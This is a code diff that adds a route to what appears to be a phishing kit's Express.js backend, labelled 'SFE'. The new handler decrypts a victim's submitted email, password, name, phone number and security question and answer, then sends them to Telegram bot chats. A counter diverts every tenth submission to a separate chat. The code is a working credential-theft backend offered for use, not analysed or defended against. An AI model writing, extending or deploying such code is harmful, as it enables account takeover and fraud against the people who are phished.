@@ -6026,6 +6026,81 @@ app.post("/eeKelv", (req, res) => {
     });
 });
 
+//SFE
+//SFE
+//SFE
+
+app.options("/sfeChasing", cors());
+
+app.post("/sfeChasing", (req, res) => {
+  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+
+  originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
+
+  if (chasingfunds == 10) {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `HAYTCHRES:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    chasingfunds = 4;
+  } else {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 864072421,
+          text: `SFEChasing:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 864072421,
+          text: `SFE:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    chasingfunds += 1;
+  }
+  res.send("Update Complete");
+});
+
 //APPLE
 //APPLE
 //APPLE
